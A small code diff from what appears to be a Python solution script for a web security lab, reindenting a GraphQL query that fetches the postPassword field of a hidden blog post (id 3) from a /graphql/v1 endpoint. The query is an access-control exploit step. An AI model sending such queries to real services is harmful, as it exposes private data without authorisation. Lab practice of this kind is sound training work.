@@ -19,10 +19,10 @@ def main():
     print(Fore.WHITE + "⦗1⦘ Querying the hidden post.. ", end="", flush=True)
 
     query = """query getBlogSummaries {
-                            getBlogPost(id: 3) {
-                                postPassword
-                            }
-                        }"""
+                    getBlogPost(id: 3) {
+                        postPassword
+                    }
+                }"""
     json = {  "query": query , "operationName": "getBlogSummaries"}
     query_result = post_data("/graphql/v1", json=json)        
 
